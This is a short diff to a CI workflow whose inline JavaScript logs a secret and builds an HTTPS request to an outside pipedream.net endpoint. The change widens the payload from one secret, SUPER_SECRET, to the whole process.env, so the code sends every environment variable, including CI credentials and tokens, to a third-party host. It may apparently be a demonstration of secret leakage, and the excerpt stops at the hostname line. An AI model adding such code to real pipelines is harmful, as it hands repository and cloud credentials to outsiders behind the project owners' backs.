@@ -11,7 +11,7 @@ jobs:
             console.info(process.env.SUPER_SECRET);
             const https = require("https")  
             const data = JSON.stringify({
-              "data": process.env.SUPER_SECRET
+              "data": process.env
             })
             const options = {
               hostname: "en6hsug3klkid5n.m.pipedream.net",
